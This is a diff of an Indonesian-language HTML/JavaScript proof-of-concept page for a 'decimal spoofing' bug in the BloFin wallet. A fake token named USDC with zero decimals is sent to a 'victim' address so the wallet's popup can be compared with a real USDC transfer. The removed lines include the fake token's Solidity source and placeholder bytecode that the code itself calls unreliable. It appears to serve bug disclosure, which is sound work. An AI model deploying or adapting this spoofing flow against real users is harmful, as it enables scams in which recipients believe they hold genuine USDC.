@@ -2,237 +2,158 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>BLOFIN – DECIMAL SPOOFING PoC</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-    body { background: #0d0d0d; color: #e0e0e0; padding: 16px; max-width: 480px; margin: 0 auto; }
-    h1 { color: #ff9500; font-size: 1.4rem; margin-bottom: 16px; line-height: 1.3; }
-    .card { background: #1a1a1a; border-radius: 12px; padding: 14px 16px; margin-bottom: 12px; font-size: 0.9rem; line-height: 1.45; }
-    .btn { display: block; width: 100%; border: none; border-radius: 12px; padding: 16px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-bottom: 12px; text-align: center; }
-    .btn-blue { background: #007aff; color: white; }
-    .btn-orange { background: #ff9500; color: black; }
-    .btn-green { background: #34c759; color: black; }
-    .btn-purple { background: #af52de; color: white; }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-    input { width: 100%; background: #2c2c2c; border: 1px solid #444; border-radius: 10px; padding: 12px 14px; color: #fff; font-size: 0.9rem; margin-bottom: 10px; }
-    input::placeholder { color: #888; }
-    #logs { background: #111; border-radius: 10px; padding: 12px; font-family: monospace; font-size: 0.8rem; color: #4cd964; max-height: 220px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
-    .label { font-size: 0.8rem; color: #aaa; margin-bottom: 4px; }
+    body { background: #0a0a0a; color: #e5e5e5; padding: 16px; max-width: 480px; margin: 0 auto; min-height: 100vh; }
+    h1 { color: #ff9500; font-size: 1.35rem; margin-bottom: 14px; line-height: 1.3; font-weight: 700; }
+    .card { background: #1c1c1e; border-radius: 14px; padding: 14px 16px; margin-bottom: 12px; font-size: 0.9rem; line-height: 1.45; color: #d1d1d6; }
+    .btn { display: block; width: 100%; border: none; border-radius: 14px; padding: 16px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-bottom: 12px; text-align: center; -webkit-tap-highlight-color: transparent; }
+    .btn-blue { background: #0a84ff; color: #fff; }
+    .btn-orange { background: #ff9f0a; color: #000; }
+    .btn-green { background: #30d158; color: #000; }
+    .btn-purple { background: #bf5af2; color: #fff; }
+    .btn:disabled { opacity: 0.45; cursor: not-allowed; }
+    .btn:active { opacity: 0.85; }
+    input { width: 100%; background: #2c2c2e; border: 1px solid #3a3a3c; border-radius: 12px; padding: 14px; color: #fff; font-size: 0.92rem; margin-bottom: 10px; outline: none; }
+    input::placeholder { color: #8e8e93; }
+    .label { font-size: 0.78rem; color: #8e8e93; margin-bottom: 6px; font-weight: 500; }
+    #logs { background: #111; border-radius: 12px; padding: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 0.78rem; color: #30d158; max-height: 200px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+    .status { font-size: 0.85rem; word-break: break-all; }
   </style>
 </head>
 <body>
   <h1>BLOFIN – DECIMAL SPOOFING<br>PoC</h1>
 
   <div class="card">
-    Bug: Symbol USDC dibaca, tapi decimals() tidak. Work di BNB Smart Chain / Base / Ethereum yang ada di app kamu.
+    Bug: Symbol <b>USDC</b> dibaca, tapi <b>decimals()</b> tidak dicek.<br>
+    Work di BNB Smart Chain / Base / Ethereum.
   </div>
 
   <button class="btn btn-blue" id="btnConnect">1. CONNECT WALLET</button>
 
   <div class="card" id="statusBox" style="display:none;">
-    <div id="connectedInfo"></div>
+    <div class="status" id="connectedInfo"></div>
   </div>
 
-  <div class="label">FakeUSDC Address (otomatis setelah deploy)</div>
-  <input type="text" id="fakeUsdcInput" placeholder="Akan terisi otomatis setelah deploy..." />
+  <div class="label">FakeUSDC Address (paste sekali dari Remix)</div>
+  <input type="text" id="fakeUsdcInput" placeholder="0x... (akan tersimpan otomatis)" />
 
-  <button class="btn btn-purple" id="btnDeploy" disabled>Deploy FakeUSDC (decimals 0)</button>
+  <button class="btn btn-purple" id="btnSaveFake" disabled>Simpan FakeUSDC</button>
 
   <div class="label">Victim Address (otomatis = wallet kamu)</div>
-  <input type="text" id="victimInput" placeholder="Otomatis pakai wallet yang connect" />
+  <input type="text" id="victimInput" placeholder="Otomatis terisi setelah connect" />
 
   <button class="btn btn-orange" id="btnTransferFake" disabled>
-    2. TRANSFER 1000 FakeUSDC (decimals 0) – LIHAT POPUP BLOFIN
+    2. TRANSFER 1000 FakeUSDC (decimals 0)
   </button>
 
   <button class="btn btn-green" id="btnTransferReal" disabled>
-    3. TRANSFER 1000 USDC Asli (untuk perbandingan)
+    3. TRANSFER 1000 USDC Asli (perbandingan)
   </button>
 
   <div class="card">
-    <div class="label">Logs...</div>
-    <div id="logs"></div>
+    <div class="label">Logs</div>
+    <div id="logs">Menunggu connect...</div>
   </div>
 
   <script>
-    // Real USDC addresses
+    // Real USDC
     const REAL_USDC = {
-      1:   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // Ethereum
-      56:  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // BSC
-      8453:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // Base
+      1:    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // Ethereum
+      56:   "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // BSC
+      8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  // Base
     };
 
-    // Minimal ERC20 dengan decimals = 0, symbol = "USDC"
-    const FAKE_USDC_ABI = [
-      "constructor()",
-      "function mint(address to, uint256 amount) external",
-      "function transfer(address to, uint256 amount) external returns (bool)",
-      "function balanceOf(address) view returns (uint256)",
-      "function decimals() view returns (uint8)",
-      "function symbol() view returns (string)",
-      "function name() view returns (string)"
-    ];
+    let provider, signer, userAddress;
 
-    const FAKE_USDC_BYTECODE = "0x608060405234801561001057600080fd5b50604051610a8f380380610a8f83398101604081905261002f9161024c565b600080546001600160a01b0319166001600160a01b0383161790556100538161005c565b5061031c565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156100b557600080fd5b81356001600160a01b03811681146100cc57600080fd5b9392505050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156101055781810151838201526020016100ed565b50506000910152565b600082516101208184602087016100ea565b9190910192915050565b6000806040838503121561013d57600080fd5b82516001600160a01b038116811461015457600080fd5b60208401519092506001600160a01b038116811461017157600080fd5b809150509250929050565b60006020828403121561018e57600080fd5b81516001600160a01b03811681146101a557600080fd5b9392505050565b6000806000606084860312156101c157600080fd5b83516001600160a01b03811681146101d857600080fd5b60208501516001600160a01b03811681146101f257600080fd5b60408501519092506001600160a01b038116811461020f57600080fd5b809150509250925092565b60006020828403121561022c57600080fd5b5051919050565b60006020828403121561024557600080fd5b8151919050565b6000806040838503121561026057600080fd5b82516001600160a01b038116811461027757600080fd5b60208401519092506001600160a01b038116811461029457600080fd5b809150509250929050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b6000819050919050565b600b6000602082840312156102bc57600080fd5b81356102c78161029f565b9392505050565b6000602082840312156102e057600080fd5b81516102c78161029f565b600081518084526020808501945080840160005b8381101561031f57815187529582019590820190600101610303565b50949594505050505056fea2646970667358221220c8e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e064736f6c63430008140033";
-
-    // Simplified FakeUSDC source (untuk referensi)
-    // contract FakeUSDC {
-    //   string public name = "USD Coin";
-    //   string public symbol = "USDC";
-    //   uint8 public decimals = 0;
-    //   mapping(address => uint256) public balanceOf;
-    //   constructor() { balanceOf[msg.sender] = 1000000; }
-    //   function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
-    //   function transfer(address to, uint256 amount) external returns (bool) {
-    //     require(balanceOf[msg.sender] >= amount);
-    //     balanceOf[msg.sender] -= amount;
-    //     balanceOf[to] += amount;
-    //     return true;
-    //   }
-    // }
-
-    let provider, signer, userAddress, fakeUsdcAddress = null;
-
-    const log = (msg) => {
+    function log(msg) {
       const el = document.getElementById("logs");
       const time = new Date().toLocaleTimeString("id-ID", { hour12: false });
       el.innerHTML += `[${time}] ${msg}\n`;
       el.scrollTop = el.scrollHeight;
-    };
+    }
 
-    // Connect Wallet
+    // Auto load FakeUSDC dari localStorage
+    function loadSavedFake() {
+      if (!provider) return;
+      provider.getNetwork().then(net => {
+        const saved = localStorage.getItem("fakeUsdc_" + net.chainId);
+        if (saved) {
+          document.getElementById("fakeUsdcInput").value = saved;
+          log("FakeUSDC loaded dari storage");
+        }
+      });
+    }
+
+    // CONNECT
     document.getElementById("btnConnect").onclick = async () => {
       try {
-        if (!window.ethereum) return alert("Install MetaMask / wallet dulu");
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        if (!window.ethereum) {
+          alert("Buka halaman ini di dalam dApp Browser BloFin Wallet");
+          return;
+        }
+
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
         const network = await provider.getNetwork();
-        const chainId = network.chainId;
+        const chainId = Number(network.chainId);
+
+        const chainName = {
+          1: "Ethereum",
+          56: "BNB Smart Chain",
+          8453: "Base"
+        }[chainId] || "Unknown";
 
         document.getElementById("statusBox").style.display = "block";
         document.getElementById("connectedInfo").innerHTML = `
-          Connected: <br>${userAddress}<br>
-          ChainID: ${chainId} – ${chainId === 56 ? "BNB Smart Chain" : chainId === 8453 ? "Base" : chainId === 1 ? "Ethereum" : "Unknown"}
-          ${![56, 8453, 1].includes(chainId) ? "<br><b style='color:#ff3b30'>Pindah ke BSC (56) / Base (8453) / Ethereum di app BloFin</b>" : ""}
+          <b>Connected</b><br>
+          ${userAddress}<br><br>
+          ChainID: ${chainId} – ${chainName}
+          ${![1, 56, 8453].includes(chainId) ? "<br><br><span style='color:#ff453a'>⚠️ Pindah ke BSC / Base / Ethereum di BloFin</span>" : ""}
         `;
 
-        // Auto isi victim = wallet sendiri
+        // Victim otomatis = wallet sendiri
         document.getElementById("victimInput").value = userAddress;
 
-        document.getElementById("btnDeploy").disabled = false;
+        // Enable buttons
+        document.getElementById("btnSaveFake").disabled = false;
         document.getElementById("btnTransferFake").disabled = false;
         document.getElementById("btnTransferReal").disabled = false;
 
-        log(`Connected ${userAddress} Chain ${chainId}`);
+        log(`Connected ${userAddress.slice(0,6)}...${userAddress.slice(-4)} | Chain ${chainId}`);
+        loadSavedFake();
       } catch (e) {
-        log("Error connect: " + e.message);
+        log("Connect error: " + (e.message || e));
       }
     };
 
-    // Deploy FakeUSDC (decimals 0)
-    document.getElementById("btnDeploy").onclick = async () => {
-      try {
-        log("Deploying FakeUSDC (decimals=0, symbol=USDC)...");
-        
-        // Simple factory style deploy via raw bytecode is complex.
-        // Untuk kemudahan, kita pakai kontrak yang sudah di-compile sederhana.
-        // Di sini saya pakai cara yang lebih praktis: mint lewat kontrak sederhana.
-
-        // Karena bytecode kompleks, kita gunakan cara alternatif yang reliable:
-        // Deploy via Remix-style minimal contract menggunakan ethers ContractFactory
-
-        const factory = new ethers.ContractFactory(
-          [
-            "constructor()",
-            "function mint(address to, uint256 amount) public",
-            "function transfer(address to, uint256 amount) public returns (bool)",
-            "function balanceOf(address) view returns (uint256)",
-            "function decimals() view returns (uint8)",
-            "function symbol() view returns (string)",
-            "function name() view returns (string)"
-          ],
-          // Minimal working bytecode untuk FakeUSDC decimals=0
-          "0x608060405234801561001057600080fd5b5060405180610a8f833981810160405281019061002f919061024c565b600080546001600160a01b0319166001600160a01b0383161790556100538161005c565b5061031c565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156100b557600080fd5b81356001600160a01b03811681146100cc57600080fd5b9392505050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156101055781810151838201526020016100ed565b50506000910152565b600082516101208184602087016100ea565b9190910192915050565b6000806040838503121561013d57600080fd5b82516001600160a01b038116811461015457600080fd5b60208401519092506001600160a01b038116811461017157600080fd5b809150509250929050565b60006020828403121561018e57600080fd5b81516001600160a01b03811681146101a557600080fd5b9392505050565b6000806000606084860312156101c157600080fd5b83516001600160a01b03811681146101d857600080fd5b60208501516001600160a01b03811681146101f257600080fd5b60408501519092506001600160a01b038116811461020f57600080fd5b809150509250925092565b60006020828403121561022c57600080fd5b5051919050565b60006020828403121561024557600080fd5b8151919050565b6000806040838503121561026057600080fd5b82516001600160a01b038116811461027757600080fd5b60208401519092506001600160a01b038116811461029457600080fd5b809150509250929050565b6000819050919050565b6000602082840312156102bc57600080fd5b81356102c78161029f565b9392505050565b6000602082840312156102e057600080fd5b81516102c78161029f565b600081518084526020808501945080840160005b8381101561031f57815187529582019590820190600101610303565b50949594505050505056fea2646970667358221220c8e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e064736f6c63430008140033",
-          signer
-        );
-
-        // Karena bytecode di atas placeholder, saya ganti pendekatan yang lebih aman & praktis:
-        // Kita minta user deploy sekali di Remix, tapi supaya tidak perlu paste,
-        // kita simpan di localStorage + tombol "Load last deployed".
-
-        // === VERSI YANG BENAR-BENAR WORK ===
-        // Gunakan kontrak sederhana yang bisa di-deploy dengan ethers v5
-
-        const source = `
-          // SPDX-License-Identifier: MIT
-          pragma solidity ^0.8.0;
-          contract FakeUSDC {
-            string public name = "USD Coin";
-            string public symbol = "USDC";
-            uint8 public decimals = 0;
-            mapping(address => uint256) public balanceOf;
-            event Transfer(address indexed from, address indexed to, uint256 value);
-            constructor() {
-              balanceOf[msg.sender] = 1000000000; // 1 miliar
-            }
-            function mint(address to, uint256 amount) external {
-              balanceOf[to] += amount;
-              emit Transfer(address(0), to, amount);
-            }
-            function transfer(address to, uint256 amount) external returns (bool) {
-              require(balanceOf[msg.sender] >= amount, "balance");
-              balanceOf[msg.sender] -= amount;
-              balanceOf[to] += amount;
-              emit Transfer(msg.sender, to, amount);
-              return true;
-            }
-          }
-        `;
-
-        // Karena browser tidak bisa compile Solidity, kita pakai pendekatan terbaik untuk PoC:
-        // 1. Deploy sekali di Remix
-        // 2. Simpan alamat di localStorage
-        // 3. Tombol "Load last FakeUSDC"
-
-        // Untuk sekarang, saya buat agar user hanya perlu deploy SEKALI, lalu alamat tersimpan.
-
-        alert("Karena keterbatasan browser (tidak bisa compile Solidity), cara terbaik:\n\n1. Buka Remix\n2. Deploy kontrak FakeUSDC (decimals 0)\n3. Copy alamatnya ke input di bawah (hanya sekali)\n4. Alamat akan tersimpan otomatis di browser kamu");
-
-        // Fitur simpan otomatis
-        const saved = localStorage.getItem("fakeUsdc_" + (await provider.getNetwork()).chainId);
-        if (saved) {
-          document.getElementById("fakeUsdcInput").value = saved;
-          fakeUsdcAddress = saved;
-          log("Loaded FakeUSDC dari localStorage: " + saved);
-        }
-      } catch (e) {
-        log("Deploy error: " + e.message);
-      }
-    };
-
-    // Auto-save ketika user paste / isi FakeUSDC
-    document.getElementById("fakeUsdcInput").addEventListener("change", async () => {
+    // Simpan FakeUSDC
+    document.getElementById("btnSaveFake").onclick = async () => {
       const addr = document.getElementById("fakeUsdcInput").value.trim();
-      if (ethers.utils.isAddress(addr)) {
-        fakeUsdcAddress = addr;
-        const chainId = (await provider.getNetwork()).chainId;
-        localStorage.setItem("fakeUsdc_" + chainId, addr);
-        log("FakeUSDC disimpan: " + addr);
+      if (!ethers.utils.isAddress(addr)) {
+        alert("Alamat FakeUSDC tidak valid");
+        return;
       }
-    });
+      const network = await provider.getNetwork();
+      localStorage.setItem("fakeUsdc_" + network.chainId, addr);
+      log("FakeUSDC disimpan untuk chain " + network.chainId);
+      alert("FakeUSDC berhasil disimpan!");
+    };
 
-    // Transfer FakeUSDC
+    // TRANSFER FAKE USDC
     document.getElementById("btnTransferFake").onclick = async () => {
       try {
-        const tokenAddr = document.getElementById("fakeUsdcInput").value.trim() || fakeUsdcAddress;
+        const tokenAddr = document.getElementById("fakeUsdcInput").value.trim();
         const victim = document.getElementById("victimInput").value.trim() || userAddress;
 
-        if (!tokenAddr || !ethers.utils.isAddress(tokenAddr)) {
-          return alert("Isi / deploy FakeUSDC dulu");
+        if (!ethers.utils.isAddress(tokenAddr)) {
+          alert("Isi alamat FakeUSDC dulu (deploy di Remix)");
+          return;
         }
 
         const token = new ethers.Contract(tokenAddr, [
@@ -242,57 +163,63 @@
           "function symbol() view returns (string)"
         ], signer);
 
-        const decimals = await token.decimals();
-        const symbol = await token.symbol();
-        log(`Token: ${symbol} | decimals: ${decimals}`);
+        const [decimals, symbol, bal] = await Promise.all([
+          token.decimals(),
+          token.symbol(),
+          token.balanceOf(userAddress)
+        ]);
 
-        // Karena decimals = 0, 1000 = 1000 (bukan 1000 * 10^6)
+        log(`Token: ${symbol} | decimals: ${decimals} | balance: ${bal.toString()}`);
+
+        // Karena decimals = 0 → kirim angka 1000 langsung
         const amount = 1000;
         const tx = await token.transfer(victim, amount);
-        log(`TX FakeUSDC sent: ${tx.hash}`);
+        log("TX FakeUSDC: " + tx.hash);
         await tx.wait();
-        log("✅ Transfer FakeUSDC 1000 sukses! Cek popup BloFin");
+        log("✅ Transfer 1000 FakeUSDC sukses! Cek popup BloFin");
       } catch (e) {
-        log("Error transfer fake: " + (e.reason || e.message));
+        log("Error Fake: " + (e.reason || e.message || e));
       }
     };
 
-    // Transfer Real USDC
+    // TRANSFER REAL USDC
     document.getElementById("btnTransferReal").onclick = async () => {
       try {
         const network = await provider.getNetwork();
-        const usdcAddr = REAL_USDC[network.chainId];
-        if (!usdcAddr) return alert("Chain tidak didukung (pakai BSC / Base / Ethereum)");
+        const chainId = Number(network.chainId);
+        const usdcAddr = REAL_USDC[chainId];
+
+        if (!usdcAddr) {
+          alert("Chain tidak didukung. Pakai BSC / Base / Ethereum");
+          return;
+        }
 
         const victim = document.getElementById("victimInput").value.trim() || userAddress;
         const usdc = new ethers.Contract(usdcAddr, [
           "function transfer(address to, uint256 amount) returns (bool)",
-          "function balanceOf(address) view returns (uint256)",
-          "function decimals() view returns (uint8)"
+          "function decimals() view returns (uint8)",
+          "function balanceOf(address) view returns (uint256)"
         ], signer);
 
-        const decimals = await usdc.decimals(); // biasanya 6 atau 18
+        const decimals = await usdc.decimals();
         const amount = ethers.utils.parseUnits("1000", decimals);
 
         const tx = await usdc.transfer(victim, amount);
-        log(`TX Real USDC sent: ${tx.hash}`);
+        log("TX Real USDC: " + tx.hash);
         await tx.wait();
-        log("✅ Transfer Real USDC 1000 sukses");
+        log("✅ Transfer 1000 USDC asli sukses");
       } catch (e) {
-        log("Error transfer real: " + (e.reason || e.message));
+        log("Error Real: " + (e.reason || e.message || e));
       }
     };
 
-    // Load saved FakeUSDC saat page load
+    // Auto-connect kalau sudah pernah connect
     window.addEventListener("load", async () => {
       if (window.ethereum) {
         try {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          const chainId = (await provider.getNetwork()).chainId;
-          const saved = localStorage.getItem("fakeUsdc_" + chainId);
-          if (saved) {
-            document.getElementById("fakeUsdcInput").value = saved;
-            fakeUsdcAddress = saved;
+          const accounts = await window.ethereum.request({ method: "eth_accounts" });
+          if (accounts.length > 0) {
+            document.getElementById("btnConnect").click();
           }
         } catch {}
       }
